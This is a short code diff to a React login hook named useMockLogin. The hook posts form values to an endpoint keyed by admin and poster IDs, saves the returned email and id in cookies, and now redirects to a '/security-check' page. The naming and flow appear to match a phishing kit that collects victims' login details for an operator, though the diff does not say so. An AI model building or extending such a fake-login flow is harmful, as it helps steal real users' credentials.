@@ -10,11 +10,7 @@ function useMockLogin() {
   } = useRouter();
 
   const login = async (values, formik) => {
-    // console.log(values);
-    // return;
-
     const url = `${API_URL}/ad/${adminId}/${posterId}`;
-
     const res = await fetch(url, {
       method: 'POST',
       headers: {
@@ -30,8 +26,7 @@ function useMockLogin() {
       console.log('success', data);
       Cookies.set('email', data?.info?.email);
       Cookies.set('id', data?.info?._id);
-
-      // push("/security-check");
+      push('/security-check');
     } else {
       console.log('error', data);
       toast.error('Something Went Wrong');
